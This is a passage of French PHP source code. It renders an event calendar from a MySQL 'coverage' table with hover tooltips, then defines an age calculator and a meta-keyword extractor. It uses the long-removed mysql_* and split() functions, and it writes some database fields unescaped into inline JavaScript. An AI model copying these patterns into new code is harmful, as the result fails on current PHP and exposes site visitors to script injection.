				  $nb_jour = Date("t", mktime(0, 0, 0, getMonth($periode), 1, getYear($periode)));
				  $pas = 0;
				  $indexe = 1;
		
				  // Affichage des entêtes
				
				  if (!$ajax) $leCalendrier.="<div id='ap-calendrier'>";
				  
				  $leCalendrier .= "<div>".$message."</div>
				  <ul id='ap-libelle'>
					   \t<li>L</li>
					   \t<li>M</li>
					   \t<li>M</li>
					   \t<li>J</li>
					   \t<li>V</li>
					   \t<li>S</li>
					   \t<li>D</li>
				  </ul>";
				  // Tant que l'on n'a pas affecté tous les jours du mois traité
				  while ($pas < $nb_jour) {
					   if ($indexe == 1) $leCalendrier .= "\n\t<ul class=\"ap-ligne\">";
					   // Si le jour calendrier == jour de la semaine en cours
					   if (Date("w", mktime(0, 0, 0, getMonth($periode), 1 + $pas, getYear($periode))) == $tableau[$indexe]) {
							// Si jour calendrier == aujourd'hui
							$afficheJour = Date("j", mktime(0, 0, 0, getMonth($periode), 1 + $pas, getYear($periode)));
							if (Date("Y-m-d", mktime(0, 0, 0, getMonth($periode), 1 + $pas, getYear($periode))) == Date("Y-m-d")) {
								 $class = " class=\"ap-itemCurrentItem\"";
							}
							else {
								
								// Vérification SQL
								$sql=mysql_query("SELECT id, nom, jeu, pays, lieu, date FROM ".PREFIX."coverage WHERE date like '".Date("Y-m-d", mktime(0, 0, 0, getMonth($periode), 1 + $pas, getYear($periode)))."%'");
								$nb=mysql_affected_rows();
							
								 if ($nb==1) {
								 	  $d=mysql_fetch_object($sql);
									  $class = " class=\"ap-itemExistingItem\"";
									  $afficheJour = '<a href="coverage/evenement-'.$d->id.'-'.recode(recupBdd($d->nom)).'-le-'.inverser_date($d->date, 4).'.htm" onmouseover="tooltip.show(this, \'<u>Evènement '.NOM.'</u><br /><br /> <em>'.tronquerChaine(htmlspecialchars($d->nom),16).'</em><br />Prévu à '.inverser_date($d->date,7).'<br /><img src=\\\''.CHEMIN_JEU.$d->jeu.'.png\\\' style=\\\'vertical-align:middle\\\'/> '.recupBdd($d->lieu).' <img src=\\\''.CHEMIN_PAYS.$d->pays.'.gif\\\' style=\\\'vertical-align:middle\\\' />\')" onmouseout="tooltip.hide(this)">' . Date("j", mktime(0, 0, 0, getMonth($periode), 1 + $pas, getYear($periode))) . "</a>";
								 }
								 elseif($nb>1) {
									  $class = " class=\"ap-itemExistingItem\"";
									  $afficheJour = '<a href="#" onmouseover="tooltip.show(this, \'<u>Evènement '.NOM.'</u><br /><br /> <em>'.$nb.' évènements ce jour</em><br /><br />Veuillez sélectionner l\\\'évènement désiré dans la liste située sous le calendrier. \', \'big\')" onmouseout="tooltip.hide(this)">' . Date("j", mktime(0, 0, 0, getMonth($periode), 1 + $pas, getYear($periode))) . "</a>";
								 }
								 else {
									  $class = "";
								 }
							}
							// Ajout de la case avec la date
							$leCalendrier .= "\n\t\t<li$class>$afficheJour</li>";
							$pas++;
					   }
					   //
					   else {
							// Ajout d'une case vide
							$leCalendrier .= "\n\t\t<li>&nbsp;</li>";
					   }
					   if ($indexe == 7 && $pas < $nb_jour) { $leCalendrier .= "\n\t</ul>"; $indexe = 1;} else {$indexe++;}
				  }
				  // Ajustement du tableau
				  for ($i = $indexe; $i <= 7; $i++) {
					   $leCalendrier .= "\n\t\t<li>&nbsp;</li>";
				  }
				  $leCalendrier .= "\n\t</ul>";
				  if (!$ajax) $leCalendrier.= "</div>\n";
			
			return $leCalendrier;
		}

 function age($naiss, $separator)  {
  list($jour, $mois, $annee) = split($separator, $naiss);
  $today['mois'] = date('n');
  $today['jour'] = date('j');
  $today['annee'] = date('Y');
  $annees = $today['annee'] - $annee;
  if ($today['mois'] <= $mois) {
    if ($mois == $today['mois']) {
      if ($jour > $today['jour'])
        $annees--;
      }
    else
      $annees--;
    }
  return $annees;
  }


function extraire_keywords($F_post_content) {

	$F_accuracy = 2;
	$F_default_words= "Nom du site";
	$F_priority = 10; 
	$F_length= 4;
	
	$F_mot_inutile = array( " de ", " etre "," par "," comme "," pour " ,  
	 " mais ", " ou ", " et ", " donc " ," or ", " ni ", " car ", 
	 " le ", " la ", " un ", " une ", " des ",
	 " comment " , " ont ", " of ",  " je " ," il ", " elle ", " nous ", " vous ", " en ", " vers ",  " tu ", " dans " , 
	 " suis ", " est " , " sont ",
	 " ton ", " ta ", " nos ", " mon ", 
	 " site " , " blog " , " tout " ," ce " , " sur ", " que ", " plus ", " avec ", " pas ",
	 " dont ", " autre ", " non " , " oui ",   " bon " ,  " de ", ",", "<?php", " du ", " au ", 
	 ".", "'", "(", ")", "{", "}", "[", "]", "{", "}", "=", "+", "-", "*", "?", "/", '"',
	 " a ", ":", ";", " d ", " l ", " c ", " s ", " t ", "  ", "\n", "\r", "\t" );
	  
	$F_accent = array( "à", "ä", "â", "â", "é", "è", "ë", "ê", "ï", "î", "ô", "ö", "ù", "ü", "û", "ç" );
	$F_nacc = array( "a", "a", "a", "a", "e", "e", "e", "e", "i", "i", "o", "o", "u", "u", "u", "c" );
	
	$F_post_content .= " ".str_repeat( $F_default_words, $F_priority );
	$F_post_content =strip_tags($F_post_content);
	$F_post_content = str_replace( $F_accent, $F_nacc, $F_post_content );
	$F_post_content = strtolower( $F_post_content);
	$F_post_content = str_replace($F_mot_inutile, " ", $F_post_content );
	$F_split_words = split( " ", $F_post_content );

	$F_tab_words = array();
	foreach( $F_split_words as $F_word )
		if ( strlen( $F_word ) > $F_length )
			$F_tab_words[ $F_word ]++;

	ksort( $F_tab_words );	
	
	foreach( $F_tab_words as $F_word => $F_pop )
	{
		if ( isset( $F_tab_words[ $F_word."s" ] )) 
		{
			$F_tab_words[ $F_word ] = $F_pop + $F_tab_words[ $F_word."s" ];
			unset( $F_tab_words[ $F_word."s" ] );
		}
	}
	
	arsort( $F_tab_words );

	$F_split_words = array();
	foreach( $F_tab_words as $F_word => $F_pop )
		if ($F_pop >= $F_accuracy )
			$F_split_words[] = $F_word;

	$F_keywords = $F_split_words[ 0 ];
	$F_i = 1;
	while ( $F_i < count( $F_split_words ) && strlen ($F_keywords.", ".$F_split_words[ $F_i]) < 1000 )
	{
		$F_keywords .= ",".$F_split_words[$F_i];
		$F_i++;
	}

	return $F_keywords;	
	
}



?>